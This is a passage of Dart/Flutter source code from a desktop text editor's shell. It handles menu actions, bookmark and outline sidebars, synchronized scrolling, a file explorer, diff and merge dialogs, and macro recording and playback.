      setState(() {});
    }
    if (_layout.root == null) _newUntitledPane();
    _scheduleSessionSave();
  }

  // Menu action dispatch: editing actions go to the active editor; open creates
  // a new pane; language/about/exit are handled by the shell itself.
  void _onMenuAction(String action, {bool fromKey = false}) {
    // Menu items that are plain editor commands go into a recording macro
    // too (the keyboard path records in the editor; this is the menu path —
    // [fromKey] marks a keyboard-originated shell action, already recorded).
    if (!fromKey && _macro.recording && _cmdNames.lookup(action) != null) {
      _macro.add(MacroCommand(action));
    }
    switch (action) {
      case 'macro.record':
        _toggleMacroRecord();
      case 'macro.play':
        _playLastMacro();
      case 'macro.playTimes':
        _playMacroTimes();
      case 'macro.save':
        _saveMacro();
      case 'macro.manage':
        _manageMacros();
      case 'file.new':
        _newUntitledPane();
      case 'file.newWindow':
        _openNewWindow();
      case 'file.open':
        _openNewFile();
      case 'file.save':
        _active?.save();
      case 'file.saveAs':
        _active?.saveAs();
      case 'file.reload':
        _active?.reloadFile();
      case 'file.buildIndex':
        _active?.promptBuildIndex();
      case 'file.saveAll':
        _saveAll();
      case 'file.closeAll':
        _closePanes([for (final it in _allItems()) it.id as int]);
      case 'file.closeTab':
        final id = _activeId;
        if (id != null) _requestClosePane(id);
      case 'file.reopenTab':
        _reopenClosedTab();
      case 'view.commandPalette':
        _openCommandPalette();
      case 'view.wordCount':
        _active?.showWordCount();
      case 'view.diff':
        _openDiffDialog();
      case 'view.merge3':
        _openMergeDialog();
      case 'view.explorer':
        _toggleExplorer();
      case 'view.tail':
        _active?.toggleTail();
      case 'view.outline':
        _toggleOutlinePanel();
      case 'bookmark.panel':
        setState(() => _bookmarkPanelOpen = !_bookmarkPanelOpen);
      case 'view.syncScrollV':
        setState(() => _syncScrollV = !_syncScrollV);
      case 'view.syncScrollH':
        setState(() => _syncScrollH = !_syncScrollH);
      case 'file.readOnly':
        _active?.toggleReadOnly();
      case 'view.rtlLayout':
        _active?.toggleRtlLayout();
      case 'file.print':
        _openPrintDialog();
      case 'run.prompt':
        _runPrompt();
      case 'run.manage':
        _manageRunCommands();
      case 'run.command':
        break; // only via keymap args (dynamic Run submenu)
      case 'edit.clipboardHistory':
        _openClipboardHistory();
      case 'edit.columnEditor':
        _openColumnEditor();
      case 'view.zoomIn':
        _zoomFont(1);
      case 'view.zoomOut':
        _zoomFont(-1);
      case 'view.zoomReset':
        _zoomFont(0);
      case 'file.exit':
      case 'file.closeWindow':
        _closeWindow();
      case 'edit.undo':
        _active?.undo();
      case 'edit.redo':
        _active?.redo();
      case 'edit.copy':
        _active?.copy();
      case 'edit.paste':
        _active?.paste();
      case 'edit.cut':
        _active?.cut();
      case 'edit.selectAll':
        _active?.selectAllText();
      case 'edit.indent' ||
          'edit.outdent' ||
          'edit.upper' ||
          'edit.lower' ||
          'edit.joinLines' ||
          'edit.sortAsc' ||
          'edit.sortDesc' ||
          'edit.dedupeLines' ||
          'edit.removeEmptyLines' ||
          'edit.trimTrailing' ||
          'edit.reverseLines' ||
          'cursor.addAbove' ||
          'cursor.addBelow' ||
          'cursor.selectAllOccurrences' ||
          'cursor.addNextOccurrence' ||
          'cursor.clear' ||
          'fold.fold' ||
          'fold.unfold' ||
          'fold.all' ||
          'fold.unfoldAll' ||
          'edit.complete':
        _active?.runCommand(action); // plain editor commands (Edit → Lines / Multi-cursor)
      case 'newline.crlf':
        _active?.convertNewline('\r\n');
      case 'newline.lf':
        _active?.convertNewline('\n');
      case 'search.find':
        _active?.openSearch();
      case 'search.replace':
        _active?.openReplace();
      case 'search.findNext':
        _active?.findNext();
      case 'search.findPrev':
        _active?.findPrev();
      case 'search.gotoLine':
        _active?.promptGotoLine();
      case 'search.findInFiles':
        _openFindInFiles();
      case 'search.replaceInFiles':
        _openFindInFiles(replace: true);
      case 'file.quickOpen':
        _quickOpen();
      case 'file.openRecent':
        _pickRecent();
      case 'syntax.picker':
        _pickSyntax();
      case 'view.splitRight':
        _splitEditor();
      case 'nav.back' || 'nav.forward' || 'nav.lastEdit':
        _active?.runCommand(action);
      case 'caret.matchBracket':
        _active?.gotoMatchingBracket();
      case 'bookmark.toggle':
        _active?.toggleBookmark();
      case 'bookmark.next':
        _active?.nextBookmark();
      case 'bookmark.prev':
        _active?.prevBookmark();
      case 'bookmark.clearAll':
        _active?.clearBookmarks();
      case 'lang.system':
        MyApp.setLocale(context, null); // follow the system locale
      case 'keymap.default':
        _setKeymap('default');
      case 'keymap.vim':
        _setKeymap('vim');
      case 'keymap.custom':
        _active?.loadCustomKeymap();
      case 'keymap.editor':
        _openKeymapEditor();
      case 'view.showSpaces':
        final s = AppSettings.instance;
        s.adopt(AppSettings.from(s)..showSpaces = !s.showSpaces);
      case 'view.showTabs':
        final s = AppSettings.instance;
        s.adopt(AppSettings.from(s)..showTabs = !s.showTabs);
      case 'view.showNewlines':
        final s = AppSettings.instance;
        s.adopt(AppSettings.from(s)..showNewlines = !s.showNewlines);
      case 'view.indentGuides':
        final s = AppSettings.instance;
        s.adopt(AppSettings.from(s)..indentGuides = !s.indentGuides);
      case 'wrap.off':
        _setWrapMode('off');
      case 'wrap.columns':
        _setWrapMode('columns');
      case 'wrap.window':
        _setWrapMode('window');
      case 'wrap.toggle': // toolbar button (the key path goes via the controller)
        _toggleWrapMode();
      case 'view.mode.text':
        _active?.setViewMode(ViewMode.text);
      case 'view.mode.column':
        _active?.setViewMode(ViewMode.column);
      case 'view.mode.hex':
        _active?.setViewMode(ViewMode.hex);
      case 'settings.open':
        showSettingsDialog(context);
      case 'settings.fileAssoc':
        showFileAssocDialog(context);
      case 'menu.editor':
        _openMenuEditor();
      case 'toolbar.editor':
        _openToolbarEditor();
      case 'appearance.editor':
        showAppearanceDialog(context);
      case 'color.editor':
        showColorSettingsDialog(context);
      case 'font.editor':
        showFontSettingsDialog(context);
      case 'help.donate':
        showDonateDialog(context);
      case 'help.about':
        showAppAboutDialog(context);
    }
  }

  // Which menu items get a check mark: currently only the three-way "mode"
  // choice (null = the item is not checkable).
  bool? _menuChecked(String action) {
    final mode = _active?.viewMode ?? ViewMode.text;
    final keymap = AppSettings.instance.keymap;
    final wrap = _active?.wrapMode ?? AppSettings.instance.softWrapMode;
    final locale = AppSettings.instance.locale;
    final newline = _active?.newlineStyle ?? '\n';
    return switch (action) {
      'newline.crlf' => newline == '\r\n',
      'newline.lf' => newline == '\n',
      'macro.record' => _macro.recording,
      'lang.system' => locale == '',
      'view.showSpaces' => AppSettings.instance.showSpaces,
      'view.showTabs' => AppSettings.instance.showTabs,
      'view.showNewlines' => AppSettings.instance.showNewlines,
      'view.indentGuides' => AppSettings.instance.indentGuides,
      'view.explorer' => AppSettings.instance.explorerOpen,
      'view.tail' => _active?.tail ?? false,
      'bookmark.panel' => _bookmarkPanelOpen,
      'view.outline' => _outlinePanelOpen,
      'view.syncScrollV' => _syncScrollV,
      'view.syncScrollH' => _syncScrollH,
      'file.readOnly' => _active?.readOnly ?? false,
      'view.rtlLayout' => _active?.rtlLayout ?? false,
      'wrap.off' => wrap == 'off',
      'wrap.toggle' => wrap != 'off',
      'wrap.columns' => wrap == 'columns',
      'wrap.window' => wrap == 'window',
      'keymap.default' => keymap == 'default',
      'keymap.vim' => keymap == 'vim',
      'view.mode.text' => mode == ViewMode.text,
      'view.mode.column' => mode == ViewMode.column,
      'view.mode.hex' => mode == ViewMode.hex,
      _ => null,
    };
  }

  void _toggleOutlinePanel() =>
      setState(() => _outlinePanelOpen = !_outlinePanelOpen);

  // Soft wrap is per tab: the View menu / alt+z / toolbar act on the active
  // pane only (the pane remembers which of columns/window "on" restores).
  // The global default for new tabs lives in AppSettings.softWrapMode and is
  // set in the font dialog.
  void _toggleWrapMode() => _active?.toggleWrap();

  void _setWrapMode(String mode) => _active?.setWrapMode(mode);

  // The menubar's "Syntax" menu (always shown): manually pick the active
  // file's highlight language (auto / each WASM language / plain text). With
  // no file open (active==null) the items are disabled.
  // Dynamic placeholder submenus (main_menu.json nodes with `"dynamic":`):
  // the JSON decides WHERE syntax/encoding sit, these build WHAT they contain —
  // the item lists come from the grammar/codec registries and can't be
  // written into JSON.
  List<Widget> _dynamicMenuChildren(String id) => switch (id) {
    'syntax' => _syntaxItems(_active),
    'encoding' => _encodingItems(_active),
    'scripts' => _scriptItems(_active),
    'recent' => _recentItems(),
    'macros' => _macroItems(),
    'run' => _runItems(),
    'languages' => _languageItems(),
    _ => const [],
  };

  // Settings → Language: "System locale" plus one item per discovered .arb
  // (native language name, AppLocalizations.discover); the check mark reflects
  // startup.locale in settings.json.
  List<Widget> _languageItems() {
    final l10n = AppLocalizations.of(context);
    final current = AppSettings.instance.locale;
    Widget check(bool on) => on
        ? const Icon(Icons.check, size: 18)
        : const SizedBox(width: 18);
    return [
      MenuItemButton(
        leadingIcon: check(current.isEmpty),
        onPressed: () => _onMenuAction('lang.system'),
        child: Text(l10n.tr('item_lang_system')),
      ),
      const Divider(height: 1),
      for (final l in AppLocalizations.supportedLocales)
        MenuItemButton(
          leadingIcon: check(
            current.isNotEmpty && AppLocalizations.localeFor(current) == l,
          ),
          onPressed: () => MyApp.setLocale(context, l),
          child: Text(AppLocalizations.nativeNameOf(l)),
        ),
    ];
  }

  // ── bookmark panel (Search → Bookmark Panel; right sidebar, session-only) ──
  bool _bookmarkPanelOpen = false;
  double _bookmarkPanelWidth = 320;
  // Any pane's bookmark set changed (each controller's bookmarksEpoch is
  // funnelled here so the panel has one thing to listen to).
  final ValueNotifier<int> _bookmarkTick = ValueNotifier<int>(0);

  void _jumpToBookmark(int paneId, int offset) {
    if (!_controllers.containsKey(paneId)) return;
    _selectItem(paneId);
    _controllers[paneId]?.selectRange(offset, offset);
  }

  // ── document outline (View → Outline; shares the right sidebar with the
  //    bookmark panel, stacked vertically) ────
  bool _outlinePanelOpen = false;

  OutlineLanguage? _outlineLanguageFor(EditorController? c) {
    if (c == null) return null;
    final mode = c.syntaxMode;
    if (mode != 'auto' && mode != 'plain') {
      final byName = OutlineConfig.instance.byName[mode];
      if (byName != null) return byName;
    }
    final p = c.path;
    return p == null ? null : OutlineConfig.instance.forPath(p);
  }

  void _jumpToOutline(int offset) {
    final id = _activeId;
    if (id == null) return;
    _controllers[id]?.selectRange(offset, offset);
    _controllers[id]?.focusEditor();
  }

  // Right sidebar: outline on top, bookmarks below (either alone fills it).
  Widget _rightSidebar() => Row(
    children: [
      MouseRegion(
        cursor: SystemMouseCursors.resizeColumn,
        child: GestureDetector(
          behavior: HitTestBehavior.opaque,
          onHorizontalDragUpdate: (d) => setState(() {
            _bookmarkPanelWidth = (_bookmarkPanelWidth - d.delta.dx).clamp(
              200.0,
              800.0,
            );
          }),
          child: Container(width: 5, color: _barFg.withValues(alpha: 0.15)),
        ),
      ),
      SizedBox(
        width: _bookmarkPanelWidth,
        child: Column(
          children: [
            if (_outlinePanelOpen)
              Expanded(
                child: OutlinePanel(
                  controller: _active,
                  language: _outlineLanguageFor(_active),
                  caretOffset: _active?.caretOffset ?? 0,
                  onJump: _jumpToOutline,
                  onClose: () => setState(() => _outlinePanelOpen = false),
                ),
              ),
            if (_outlinePanelOpen && _bookmarkPanelOpen)
              const Divider(height: 1),
            if (_bookmarkPanelOpen)
              Expanded(
                child: BookmarkPanel(
                  controllers: _controllers,
                  activeId: _activeId,
                  tick: _bookmarkTick,
                  onJump: _jumpToBookmark,
                  onClose: () => setState(() => _bookmarkPanelOpen = false),
                ),
              ),
          ],
        ),
      ),
    ],
  );

  // ── synchronized scrolling of split panes (View → Sync Scroll vertical/horizontal) ──
  // Session-only toggles. A user scroll in one pane is forwarded to every
  // OTHER pane that is actually on screen (the selected tab of each tab
  // group): vertical as a row delta (files differ in length), horizontal
  // as the absolute x. Forwarded scrolls do not rebroadcast.
  bool _syncScrollV = false;
  bool _syncScrollH = false;

  List<int> _visiblePaneIds() {
    final out = <int>[];
    for (final item in _allItems()) {
      final parent = item.parent;
      if (parent is DockingTabs) {
        final sel = parent.selectedIndex;
        if (sel < 0 ||
            sel >= parent.childrenCount ||
            !identical(parent.childAt(sel), item)) {
          continue;
        }
      }
      out.add(item.id as int);
    }
    return out;
  }

  void _syncScroll(int fromId, {int? rows, double? x}) {
    if (rows != null && !_syncScrollV) return;
    if (x != null && !_syncScrollH) return;
    for (final id in _visiblePaneIds()) {
      if (id == fromId) continue;
      final c = _controllers[id];
      if (c == null) continue;
      if (rows != null) c.syncScrollRows(rows);
      if (x != null) c.syncScrollX(x);
    }
  }

  // ── file explorer sidebar (View → File Explorer, ctrl+b) ──────
  // Open/width/root live in AppSettings (written directly, like session).
  final GlobalKey<FileExplorerPanelState> _explorerKey = GlobalKey();

  void _toggleExplorer() {
    final s = AppSettings.instance;
    if (!s.explorerOpen) {
      if (s.explorerRoot.isEmpty || !Directory(s.explorerRoot).existsSync()) {
        s.explorerRoot = _defaultExplorerRoot();
      }
    }
    setState(() => s.explorerOpen = !s.explorerOpen);
    s.save();
  }

  String _defaultExplorerRoot() {
    final p = _active?.path;
    if (p != null) return File(p).parent.path;
    final home =
        Platform.environment['USERPROFILE'] ?? Platform.environment['HOME'];
    if (home != null && Directory(home).existsSync()) return home;
    return Directory.current.path;
  }

  void _setExplorerRoot(String root) {
    final s = AppSettings.instance;
    setState(() => s.explorerRoot = root);
    s.save();
  }

  // Panes closed for a rename/delete, to reopen after a rename.
  List<String> _explorerClosed = const [];

  // Panes holding [path] (or anything under it, for a folder).
  List<int> _panesUnder(String path) {
    final canon = _canonical(path);
    final prefix = canon.endsWith(Platform.pathSeparator)
        ? canon
        : '$canon${Platform.pathSeparator}';
    return [
      for (final e in _paths.entries)
        if (e.value == canon || e.value.startsWith(prefix)) e.key,
    ];
  }

  // Windows refuses to rename/delete a file while a pane holds it open, so
  // close those panes first (unsaved changes get the usual confirm). false =
  // the user kept one open, abort the operation.
  Future<bool> _explorerBeforeMutate(String path) async {
    _explorerClosed = const [];
    final ids = _panesUnder(path);
    if (ids.isEmpty) return true;
    final l10n = AppLocalizations.of(context);
    final names = [
      for (final id in ids)
        _controllers[id]?.path ?? l10n.tr('common_untitled'),
    ];
    final ok = await showDialog<bool>(
      context: context,
      builder: (ctx) => AlertDialog(
        title: Text(l10n.tr('explorer_close_open_title')),
        content: SizedBox(
          width: 480,
          child: Text(l10n.trf('explorer_close_open_body', [names.join('\n')])),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(ctx, false),
            child: Text(l10n.tr('common_cancel')),
          ),
          FilledButton(
            onPressed: () => Navigator.pop(ctx, true),
            child: Text(l10n.tr('explorer_close_and_continue')),
          ),
        ],
      ),
    );
    if (ok != true || !mounted) return false;
    final paths = [
      for (final id in ids)
        if (_controllers[id]?.path != null) _controllers[id]!.path!,
    ];
    await _closePanes(ids);
    if (ids.any(_controllers.containsKey)) return false; // kept a dirty pane
    // The pane's widget is disposed (and its file handle closed, async) only
    // when the layout rebuilds without it: wait a frame, then a moment. The
    // panel also retries the rename/delete for a short while.
    await WidgetsBinding.instance.endOfFrame;
    await Future<void>.delayed(const Duration(milliseconds: 80));
    _explorerClosed = paths;
    return true;
  }

  // Reopen the panes closed for a rename at their new paths.
  void _explorerAfterRename(String oldPath, String newPath) {
    final closed = _explorerClosed;
    _explorerClosed = const [];
    if (closed.isEmpty) return;
    final oldAbs = File(oldPath).absolute.path;
    final oldCanon = _canonical(oldPath);
    final prefix = '$oldCanon${Platform.pathSeparator}';
    final reopen = <String>[];
    for (final p in closed) {
      final pc = _canonical(p);
      if (pc == oldCanon) {
        reopen.add(newPath);
      } else if (pc.startsWith(prefix)) {
        reopen.add(newPath + File(p).absolute.path.substring(oldAbs.length));
      }
    }
    if (reopen.isNotEmpty) _openCliPaths(reopen);
  }

  Widget _explorerSidebar() {
    final s = AppSettings.instance;
    return Row(
      children: [
        SizedBox(
          width: s.explorerWidth,
          child: FileExplorerPanel(
            key: _explorerKey,
            root: s.explorerRoot,
            activePath: _active?.path,
            onOpen: (p) => _openCliPaths([p]),
            onRootChanged: _setExplorerRoot,
            onRevealInOs: _revealInFileManager,
            onBeforeMutate: _explorerBeforeMutate,
            onAfterRename: _explorerAfterRename,
            onClose: _toggleExplorer,
          ),
        ),
        // Drag handle: resize by the sidebar's right edge.
        MouseRegion(
          cursor: SystemMouseCursors.resizeColumn,
          child: GestureDetector(
            behavior: HitTestBehavior.opaque,
            onHorizontalDragUpdate: (d) {
              setState(() {
                s.explorerWidth = (s.explorerWidth + d.delta.dx).clamp(
                  AppSettings.explorerWidthMin,
                  AppSettings.explorerWidthMax,
                );
              });
              s.saveSoon();
            },
            child: Container(width: 5, color: _barFg.withValues(alpha: 0.15)),
          ),
        ),
      ],
    );
  }

  // ── file diff (View → Compare Files...) ───────────────────────
  // A diff pane is a DockingItem without a controller. Its ids live in their
  // own range so a restored session layout can drop them (diffs are not
  // persisted; see _restoreSession).
  int _nextDiffId = _diffIdBase;
  final Map<int, (String, String)> _diffPanes = {};

  // A small "pick N files" dialog shared by compare and merge: each field
  // has browse + "open tabs" pickers; every path must exist.
  Future<List<String>?> _askFiles({
    required String titleKey,
    required List<String> labelKeys,
    required List<String> initial,
    required String submitKey,
  }) async {
    final l10n = AppLocalizations.of(context);
    final open = <String>[];
    for (final item in _allItems()) {
      final p = _controllers[item.id as int]?.path;
      if (p != null && !open.contains(p)) open.add(p);
    }
    final ctls = [for (final t in initial) TextEditingController(text: t)];
    String? error;
    final ok = await showDialog<bool>(
      context: context,
      builder: (ctx) => StatefulBuilder(
        builder: (ctx, setDlg) {
          Widget field(TextEditingController ctl, String label) => Row(
            children: [
              Expanded(
                child: TextField(
                  controller: ctl,
                  decoration: InputDecoration(labelText: label, isDense: true),
                ),
              ),
              IconButton(
                tooltip: l10n.tr('diff_browse'),
                icon: const Icon(Icons.folder_open, size: 18),
                onPressed: () async {
                  final picked = await MacFiles.openFile();
                  if (picked != null) ctl.text = picked.path;
                },
              ),
              if (open.isNotEmpty)
                PopupMenuButton<String>(
                  tooltip: l10n.tr('diff_open_tabs'),
                  icon: const Icon(Icons.tab, size: 18),
                  // The default popup is capped at 280px — too narrow for a
                  // path; let it grow to most of the window and show the
                  // file name on its own line so it is readable regardless.
                  constraints: BoxConstraints(
                    minWidth: 320,
                    maxWidth: math.max(320, MediaQuery.of(ctx).size.width - 80),
                  ),
                  onSelected: (p) => ctl.text = p,
                  itemBuilder: (_) => [
                    for (final p in open)
                      PopupMenuItem(
                        value: p,
                        child: Column(
                          mainAxisSize: MainAxisSize.min,
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            Text(p.split(Platform.pathSeparator).last),
                            Text(
                              p,
                              overflow: TextOverflow.ellipsis,
                              style: TextStyle(
                                fontSize: 11,
                                color: Theme.of(ctx).disabledColor,
                              ),
                            ),
                          ],
                        ),
                      ),
                  ],
                ),
            ],
          );
          void submit() {
            for (final c in ctls) {
              final p = c.text.trim();
              if (p.isEmpty || !File(p).existsSync()) {
                setDlg(() => error = l10n.tr('diff_bad_files'));
                return;
              }
            }
            Navigator.pop(ctx, true);
          }

          return AlertDialog(
            title: Text(l10n.tr(titleKey)),
            content: ResizableDialogBox(
              id: 'filePicker',
              initialWidth: 560,
              child: Column(
                mainAxisSize: MainAxisSize.min,
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  for (var i = 0; i < ctls.length; i++) ...[
                    if (i > 0) const SizedBox(height: 8),
                    field(ctls[i], l10n.tr(labelKeys[i])),
                  ],
                  if (error != null) ...[
                    const SizedBox(height: 8),
                    Text(
                      error!,
                      style: TextStyle(
                        color: Theme.of(ctx).colorScheme.error,
                        fontSize: 12.5,
                      ),
                    ),
                  ],
                ],
              ),
            ),
            actions: [
              TextButton(
                onPressed: () => Navigator.pop(ctx, false),
                child: Text(l10n.tr('common_cancel')),
              ),
              FilledButton(onPressed: submit, child: Text(l10n.tr(submitKey))),
            ],
          );
        },
      ),
    );
    final paths = [for (final c in ctls) c.text.trim()];
    for (final c in ctls) {
      disposeLater(c);
    }
    return ok == true ? paths : null;
  }

  // Open files other than [except], in layout order (dialog prefills).
  List<String> _otherOpenPaths(String? except) {
    final out = <String>[];
    for (final item in _allItems()) {
      final p = _controllers[item.id as int]?.path;
      if (p != null && p != except && !out.contains(p)) out.add(p);
    }
    return out;
  }

  Future<void> _openDiffDialog() async {
    // Prefill: the active file on the left, the next open file on the right.
    final activePath = _active?.path;
    final others = _otherOpenPaths(activePath);
    final r = await _askFiles(
      titleKey: 'diff_title',
      labelKeys: const ['diff_left', 'diff_right'],
      initial: [activePath ?? '', others.isEmpty ? '' : others.first],
      submitKey: 'diff_compare',
    );
    if (r == null) return;
    _openDiffPane(r[0], r[1]);
  }

  Future<void> _openMergeDialog() async {
    final activePath = _active?.path;
    final others = _otherOpenPaths(activePath);
    final r = await _askFiles(
      titleKey: 'merge_title',
      labelKeys: const ['merge_base', 'merge_left', 'merge_right'],
      initial: [
        others.length > 1 ? others[1] : '',
        activePath ?? '',
        others.isEmpty ? '' : others.first,
      ],
      submitKey: 'merge_go',
    );
    if (r == null) return;
    _openMergePane(r[0], r[1], r[2]);
  }

  void _openDiffPane(String left, String right) {
    final id = _nextDiffId++;
    _diffPanes[id] = (left, right);
    final item = DockingItem(
      id: id,
      name: '',
      leading: (context, status) => _diffTabTitle(context, id, left, right),
      keepAlive: true,
      widget: DiffView(
        leftPath: left,
        rightPath: right,
        onOpenLine: _openFileAtLine,
      ),
    );
    _addItemNearActive(item);
    _selectItem(id);
  }

  void _openMergePane(String base, String left, String right) {
    final id = _nextDiffId++;
    _diffPanes[id] = (left, right);
    final item = DockingItem(
      id: id,
      name: '',
      leading: (context, status) =>
          _diffTabTitle(context, id, left, right, base: base),
      keepAlive: true,
      widget: MergeView(
        basePath: base,
        leftPath: left,
        rightPath: right,
        onOpenLine: _openFileAtLine,
        onSave: _saveMergeResult,
      ),
    );
    _addItemNearActive(item);
    _selectItem(id);
  }

  // Merge result → "save as" → encode with the left file's codec → open it.
  Future<String?> _saveMergeResult(
    String text,
    String codecName,
    String suggestedName,
  ) async {
    final l10n = AppLocalizations.of(context);
    final picked = await MacFiles.saveFile(
      dialogTitle: l10n.tr('merge_save'),
      fileName: suggestedName,
    );
    if (picked == null || !mounted) return null;
    try {
      final codec = textCodecByName(codecName);
      final bytes = codec == null
          ? utf8.encode(text)
          : codec.encode(text).bytes;
      await File(picked.path).writeAsBytes(bytes, flush: true);
    } catch (e) {
      _snack(l10n.trf('merge_save_failed', [e.toString()]));
      return null;
    }
    _snack(l10n.trf('merge_saved', [picked.path]));
    _openCliPaths([picked.path]);
    return picked.path;
  }

  // Add [item] as a new tab in the active pane's tab group (or split next
  // to a lone pane) — the placement _addEditorPane uses.
  void _addItemNearActive(DockingItem item) {
    if (_layout.root == null) {
      _layout.root = item;
      return;
    }
    final activeItem = _activeId == null
        ? null
        : _layout.findDockingItem(_activeId);
    final target = activeItem ?? _firstItem(_layout.root!);
    final parent = target?.parent;
    if (parent is DockingTabs) {
      _layout.addItemOn(
        newItem: item,
        targetArea: parent,
        dropIndex: parent.childrenCount,
      );
    } else if (target != null) {
      _layout.addItemOn(newItem: item, targetArea: target, dropIndex: 1);
    } else {
      _layout.root = item;
    }
  }

  Widget _diffTabTitle(
    BuildContext context,
    int id,
    String a,
    String b, {
    String? base,
  }) {
    String name(String p) => p.split(Platform.pathSeparator).last;
    return GestureDetector(
      behavior: HitTestBehavior.opaque,
      onSecondaryTapUp: (d) => _showTabContextMenu(id, null, d.globalPosition),
      child: Tooltip(
        message: base == null ? '$a\n$b' : '$base\n$a\n$b',
        waitDuration: const Duration(milliseconds: 600),
        child: Text(
          base == null
              ? '${name(a)} ↔ ${name(b)}'
              : '⑂ ${name(a)} ↔ ${name(b)}',
          style: TabbedViewTheme.of(context).tab.textStyle,
          overflow: TextOverflow.ellipsis,
        ),
      ),
    );
  }

  // Double-click on a diff row: open (or jump to) that file at that line.
  void _openFileAtLine(String path, int line) {
    if (!File(path).existsSync()) return;
    final canon = _canonical(path);
    int? id;
    for (final e in _paths.entries) {
      if (e.value == canon) {
        id = e.key;
        break;
      }
    }
    if (id != null) {
      _selectItem(id);
    } else {
      _touchRecent(path);
      id = _addEditorPane(path, canon);
    }
    _controllers[id]?.gotoLine(line);
  }

  // ── macros (the recorder is a global singleton; the list is cached from settings/macros/) ──

  final MacroRecorder _macro = MacroRecorder.instance;
  // Command names, to tell which menu actions are recordable editor commands.
  final CommandRegistry _cmdNames = CommandRegistry.defaults();
  late final MacroStore _macroStore = MacroStore();
  List<String> _macroNames = const [];

  void _onMacroChanged() {
    if (mounted) setState(() {});
  }

  Future<void> _refreshMacroNames() async {
    final names = await _macroStore.list();
    if (mounted) setState(() => _macroNames = names);
  }

  void _toggleMacroRecord() {
    final l10n = AppLocalizations.of(context);
    if (_macro.recording) {
      final m = _macro.stop();
      _snack(
        m == null
            ? l10n.tr('macro_empty')
            : l10n.trf('macro_rec_stopped', [m.steps.length]),
      );
    } else {
      _macro.start();
      _snack(l10n.tr('macro_rec_started'));
    }
  }

  void _snack(String msg) {
    if (!mounted) return;
    ScaffoldMessenger.of(context)
      ..removeCurrentSnackBar()
      ..showSnackBar(
        SnackBar(content: Text(msg), duration: const Duration(seconds: 2)),
      );
  }

  // Playing while recording stops the recording first (the play command
  // itself is never recorded).
  Macro? _macroToPlay() {
    if (_macro.recording) _toggleMacroRecord();
    final m = _macro.last;
    if (m == null) _snack(AppLocalizations.of(context).tr('macro_none'));
    return m;
  }

  void _playLastMacro() {
    final m = _macroToPlay();
    if (m != null) _active?.playMacro(m);
  }

  Future<void> _playMacroTimes() async {
    final m = _macroToPlay();
    if (m == null) return;
    final l10n = AppLocalizations.of(context);
    final ctl = TextEditingController(text: '1');
    var untilEof = false;
    final ok = await showDialog<bool>(
      context: context,
      builder: (ctx) => StatefulBuilder(
        builder: (ctx, setDlg) => AlertDialog(
          title: Text(l10n.tr('macro_times_title')),
          content: SizedBox(
            width: 360,
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                TextField(
                  controller: ctl,
                  autofocus: true,
                  enabled: !untilEof,
                  keyboardType: TextInputType.number,
                  decoration: InputDecoration(
                    labelText: l10n.tr('macro_times_hint'),
                    isDense: true,
                  ),
                  onSubmitted: (_) => Navigator.pop(ctx, true),
                ),
                CheckboxListTile(
                  contentPadding: EdgeInsets.zero,
                  controlAffinity: ListTileControlAffinity.leading,
                  value: untilEof,
                  onChanged: (v) => setDlg(() => untilEof = v ?? false),
                  title: Text(l10n.tr('macro_until_eof')),
                ),
              ],
            ),
          ),
          actions: [
            TextButton(
              onPressed: () => Navigator.pop(ctx, false),
              child: Text(l10n.tr('common_cancel')),
            ),
            FilledButton(
              onPressed: () => Navigator.pop(ctx, true),
              child: Text(l10n.tr('common_ok')),
            ),
          ],
        ),
      ),
    );
    final times = int.tryParse(ctl.text.trim()) ?? 0;
    disposeLater(ctl);
    if (ok != true || (!untilEof && times < 1)) return;
    _active?.playMacro(m, times: times, untilEof: untilEof);
  }

  Future<void> _saveMacro() async {
    final l10n = AppLocalizations.of(context);
    if (_macro.recording) _toggleMacroRecord();
    final m = _macro.last;
    if (m == null) {
      _snack(l10n.tr('macro_none'));
      return;
    }
    final ctl = TextEditingController(text: m.name);
    String? error;
    final name = await showDialog<String>(
      context: context,
      builder: (ctx) => StatefulBuilder(
        builder: (ctx, setDlg) {
          void submit() {
            final n = ctl.text.trim();
            if (!MacroStore.validName(n)) {
              setDlg(() => error = l10n.tr('macro_name_invalid'));
              return;
            }
            Navigator.pop(ctx, n);
          }

          return AlertDialog(
            title: Text(l10n.tr('macro_save_title')),
            content: SizedBox(
              width: 360,
              child: TextField(
                controller: ctl,
                autofocus: true,
                decoration: InputDecoration(
                  labelText: l10n.tr('macro_name_hint'),
                  helperText: l10n.trf('macro_steps', [m.steps.length]),
                  errorText: error,
                  isDense: true,
                ),
                onSubmitted: (_) => submit(),
              ),
            ),
            actions: [
              TextButton(
                onPressed: () => Navigator.pop(ctx, null),
                child: Text(l10n.tr('common_cancel')),
              ),
              FilledButton(
                onPressed: submit,
                child: Text(l10n.tr('common_save')),
              ),
            ],
          );
        },
      ),
    );
    disposeLater(ctl);
    if (name == null) return;
    try {
      await _macroStore.save(Macro(name, m.steps));
      _macro.last = Macro(name, m.steps);
      await _refreshMacroNames();
      _snack(l10n.trf('macro_saved', [name]));
    } catch (e) {
      Log.instance.w('macro save failed: $e');
      _snack(l10n.trf('macro_save_failed', [e.toString()]));
    }
  }

  Future<void> _runSavedMacro(String name) async {
    final m = await _macroStore.load(name);
    if (!mounted) return;
    if (m == null || m.steps.isEmpty) {
      _snack(AppLocalizations.of(context).trf('macro_load_failed', [name]));
      await _refreshMacroNames();
      return;
    }
    if (_macro.recording) _toggleMacroRecord();
    _macro.last = m; // "play" replays it from now on
    _active?.playMacro(m);
  }

  Future<void> _manageMacros() async {
    final l10n = AppLocalizations.of(context);
    await showDialog<void>(
      context: context,
      builder: (ctx) => StatefulBuilder(
        builder: (ctx, setDlg) => AlertDialog(
          title: Text(l10n.tr('macro_manage_title')),
          content: ResizableDialogBox(
            id: 'macroManage',
            initialWidth: 400,
            child: _macroNames.isEmpty
                ? Text(l10n.tr('macros_none'))
                : ListView(
                    shrinkWrap: true,
                    children: [
                      for (final n in _macroNames)
                        ListTile(
                          dense: true,
                          title: Text(n),
                          trailing: IconButton(
                            tooltip: l10n.tr('common_delete'),
                            icon: const Icon(Icons.delete_outline, size: 18),
                            onPressed: () async {
                              await _macroStore.delete(n);
                              await _refreshMacroNames();
                              setDlg(() {});
                            },
                          ),
                        ),
                    ],
                  ),
          ),
          actions: [
            TextButton(
              onPressed: () => Navigator.pop(ctx),
              child: Text(l10n.tr('common_close')),
            ),
          ],
        ),
      ),
    );
